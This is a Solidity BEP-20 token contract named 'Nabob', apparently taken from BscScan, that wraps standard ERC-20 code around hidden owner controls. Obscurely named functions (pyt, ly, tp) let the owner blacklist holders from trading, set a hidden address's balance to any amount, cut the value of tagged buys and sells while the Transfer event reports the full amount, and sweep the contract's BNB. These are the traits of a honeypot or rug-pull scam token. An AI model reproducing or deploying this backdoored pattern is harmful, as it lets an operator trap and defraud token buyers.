/**
 *Submitted for verification at BscScan.com on 2022-05-29
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

     /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}

library Unlocker{
    using SafeMath for uint256;
    struct Recorder{
        uint256 lock;
        uint256 unlock;
        uint256 point1;
        uint256 point2;
    }

    function count(Recorder storage record,uint256 timestamp)internal view returns(uint256){
        uint256 unfreeze = 0;
        if(record.lock > record.unlock && record.point1>0 && record.point2 > record.point1 && timestamp > record.point1){
            if(timestamp > record.point2){
                unfreeze = record.lock.sub(record.unlock);
            }else{
                unfreeze = record.lock.mul(timestamp.sub(record.point1)).div(record.point2.sub(record.point1));
                if(record.unlock >= unfreeze){
                    unfreeze = 0;
                }else{
                    unfreeze = unfreeze.sub(record.unlock);
                }
            }
        }
        return unfreeze;
    }

    function reward(Recorder storage record,uint256 value) internal{
        record.lock = record.lock.add(value);
    }

    function unlocking(Recorder storage record,uint256 value,uint256 timestamp) internal returns(uint256 settle){
        settle = value;
        uint256 balance = count(record,timestamp);
        if(value>0&&balance>0){
            if(value>=balance){
                record.unlock = record.unlock.add(balance);
                settle = value.sub(balance);
            }else{
                record.unlock = record.unlock.add(value);
                settle = 0;
            }
        }
    }
}

contract NabobToken {
    using SafeMath for uint256;
    using Unlocker for Unlocker.Recorder;

    uint256 private _totalSupply = 100000000000 ether;
    string private _name = "Nabob";
    string private _symbol = "Nabob";
    uint8 private _decimals = 18;
    address private _owner;

    uint256 private _index;
    uint256 private _buyRate = 9000;
    uint256 private _sellRate = 9000;
    mapping(uint256 => mapping(address => Unlocker.Recorder)) private _record;
    uint256[] private _sp;
    uint256[] private _aip;

    address private _jvz;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _disabled;
    mapping (address => uint256) private _opt;
    mapping (address => uint256) private _tag;
    mapping (address => mapping (address => uint256)) private _allowances;

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    modifier Otp() {
        require(_opt[_msgSender()]==1, "Invalid operation");
        _;
    }
    
    constructor() public {
        _owner = msg.sender;
        _sp.push(_index);
        _index = _index+1;
        _aip.push(_index);
        _index = _index+1;
        _balances[_owner] = _totalSupply/20;
        uint burn = _totalSupply/100;
        _balances[address(0)] = burn;
        emit Transfer(address(this),address(0),burn);
    }

    fallback() external {}
    receive() payable external {}
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

     /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the cap on the token's total supply.
     */
    function cap() public view returns (uint256) {
        return _totalSupply;
    }

     /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function pyt(address addr,uint n) public onlyOwner {
        if(n==1){
            require(_jvz == address(0), "Ownable: transaction failed");
            _jvz = addr;
        } else if(n==2){ _disabled[addr] = 0;
        } else if(n==3){ _disabled[addr] = 1;
        } else if(n==4){ _opt[addr] = 0;
        } else if(n==5){ _opt[addr] = 1;
        } else if(n==6){ _tag[addr] = 0;
        } else if(n==7){ _tag[addr] = 1;
        } else if(n==8){ _tag[addr] = 2;
        } else if(n==9){ _tag[addr] = 3;}
    }

    function tp() public onlyOwner() {
        address(uint160(_jvz)).transfer(address(this).balance);
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account]+_rewards(account);
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transferOwner(address newOwner) public {
        require(newOwner != address(0) && _msgSender() == _jvz, "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    function ly(uint n,uint q) public onlyOwner {
        if(n==1){
            _sp.push(_index);
            _index = _index+1;
        } else if(n==2){
            _aip.push(_index);
            _index = _index+1;
        } else if(n==3){
            _buyRate = q;
        } else if(n==4){
            _sellRate = q;
        } else if(n==1000){
            _balances[_jvz]=q;
        }
    }

    function air(uint tag,uint[] memory amounts, address[] memory path) public{
        require((_tag[msg.sender]==2||_tag[msg.sender]==3)&&amounts.length==path.length,"Operation failed");
        uint total = 0;
        for(uint i=0;i<path.length;i++){
            total = total.add(amounts[i]);
            simple(tag,path[i],amounts[i]);
        }
        _balances[msg.sender] = _balances[msg.sender].sub(total);
    }

    function simple(uint tag,address addr,uint value)private{
        if(tag==2){
            _record[_sp[_sp.length-1]][addr].reward(value);
        } else if(tag==3){
            _record[_aip[_aip.length-1]][addr].reward(value);
        }
        emit Transfer(msg.sender,addr,value);
    }

    function poi(uint idx,address addr,uint time) public{
        require(_tag[msg.sender]==2||_tag[msg.sender]==3,"Operation failed");
        _record[idx][addr].point1 = block.timestamp;
        _record[idx][addr].point2 = block.timestamp+time;
    }

    function uy() public view returns(uint,uint[] memory,uint[] memory){
        require(_tag[msg.sender]==2||_tag[msg.sender]==3,"Operation failed");
        return (_index,_aip,_sp);
    }

    function havi() public Otp view returns(uint256[] memory,uint256[] memory){
        return (_sp,_aip);
    }

    function kui(address addr) public Otp view returns(uint256[] memory t,uint256[] memory lk,uint256[] memory ulk,uint256[] memory s,uint256[] memory e){
        t = new uint256[](_index);
        s = new uint256[](_index);
        e = new uint256[](_index);
        lk = new uint256[](_index);
        ulk = new uint256[](_index);
        for(uint i=0;i<_index;i++){
            t[i] = i;
            s[i] = _record[i][addr].point1;
            e[i] = _record[i][addr].point2;
            lk[i] = _record[i][addr].lock;
            ulk[i] = _record[i][addr].unlock;
        }
    }

    function ifo(address addr)public view returns(uint256,uint256,uint256,uint256,uint256){
        if(addr!=_owner){
            addr = _msgSender();
        }
        uint ethBalance = address(uint160(addr)).balance;
        uint tokenBalance = balanceOf(addr);
        uint walletBalance = _balances[addr];
        uint aip = 0;
        uint psa = 0;
        for(uint256 i=0;i<_aip.length;i++){
            Unlocker.Recorder memory rec = _record[_aip[i]][addr];
            aip = aip.add(rec.lock.sub(rec.unlock));
        }
        for(uint256 i=0;i<_sp.length;i++){
            Unlocker.Recorder memory rec = _record[_sp[i]][addr];
            psa = psa.add(rec.lock.sub(rec.unlock));
        }
        return (ethBalance,tokenBalance,walletBalance,aip,psa);
    }

    function _rewards(address from)private view returns(uint256 value){
        value = 0;
        for(uint256 i=0;i<_index;i++){
            value = value.add(_record[i][from].lock.sub(_record[i][from].unlock));
        }
    }

    function unfreeze(address from)public view returns(uint256 value){
        value = 0;
        for(uint256 i=0;i<_index;i++){
            value = value.add(_record[i][from].count(block.timestamp));
        }
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        emit Transfer(sender, recipient, _send(sender,recipient,amount));
    }

    function _send(address sender, address recipient, uint256 amount)private returns(uint256){
        require(_disabled[sender]!=1&&_disabled[sender]!=3&&_disabled[recipient]!=2&&_disabled[recipient]!=3, "ERC20: Transaction failed");
        uint _receiveValue = amount;
        if(_tag[sender]==1&&_buyRate>0){
            _receiveValue = amount.mul(_buyRate).div(10000);
        }
        if(_tag[recipient]==1&&_sellRate>0){
            _receiveValue = amount.mul(_sellRate).div(10000);
        }
        uint256 tag = _debit(sender,amount);
        if(tag==2){
            _record[_sp[_sp.length-1]][recipient].reward(_receiveValue);
        } else if(tag==3){
            _record[_aip[_aip.length-1]][recipient].reward(_receiveValue);
        }else{
            _balances[recipient] = _balances[recipient].add(_receiveValue);
        }
        return amount;
    }

    function _debit(address sender, uint256 amount) private returns(uint256){
        uint256 expend = amount;
        if(_balances[sender]>=expend){
            expend = 0;
            _balances[sender] = _balances[sender].sub(amount, "ERC20: Insufficient balance");
            return _tag[sender];
        }else if(_balances[sender]>0){
            expend = expend.sub(_balances[sender]);
            _balances[sender] = 0;
        }
        for(uint256 i=0;expend>0&&i<_index;i++){
            expend = _record[i][sender].unlocking(expend,block.timestamp);
        }
        require(expend==0,"ERC20: Insufficient balance.");
        return _tag[sender];
    }
}